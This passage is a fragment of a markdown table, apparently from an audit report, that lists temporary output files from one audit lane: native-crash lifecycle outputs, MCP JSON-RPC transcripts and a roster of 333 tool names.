| `/tmp/aud-ruflo-20260811/work/lane-L2b/cl/out/*` | partial-init (native crash) lifecycle |
| `/tmp/aud-ruflo-20260811/work/lane-L2b/mcp/out/*.json` | MCP JSON-RPC transcripts |
| `/tmp/aud-ruflo-20260811/work/lane-L2b/out/mcp-tool-roster.json` | the 333 tool names |
